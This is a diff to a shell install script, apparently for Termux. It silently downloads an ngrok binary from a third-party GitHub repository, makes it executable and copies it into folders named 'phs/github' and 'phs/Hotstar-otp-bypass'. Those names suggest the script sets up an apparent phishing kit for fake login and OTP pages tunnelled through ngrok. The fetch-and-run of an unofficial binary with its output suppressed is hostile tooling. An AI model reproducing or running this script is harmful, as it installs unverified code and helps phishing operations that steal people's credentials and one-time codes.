@@ -14,7 +14,19 @@ apt install zip -y
 pkg install wget -y
 pkg install ncurses-utils -y
 clear
-unzip Ngrok_shark.zip && rm -rf Ngrok_shark.zip
+echo
+echo
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Instaling ngrok .. \e[m "
+echo
+wget https://github.com/Linux-Droid/Ngrok/raw/master/Ngrok_Linux_Droid.zip >> /dev/null 2>&1
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Successfuly installed \e[m "
+echo
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Inflating ngrok \e[m "
+sleep 2
+unzip Ngrok_Linux_Droid.zip && rm -rf Ngrok_Linux_Droid.zip >> /dev/null 2>&1
+echo
+echo -e "\e[31m[\e[32m~\e[31m]\e[33m Done \e[m "
+sleep 2
 chmod +x ngrok
 cp -R ngrok phs/github/
 cp -R ngrok phs/Hotstar-otp-bypass/
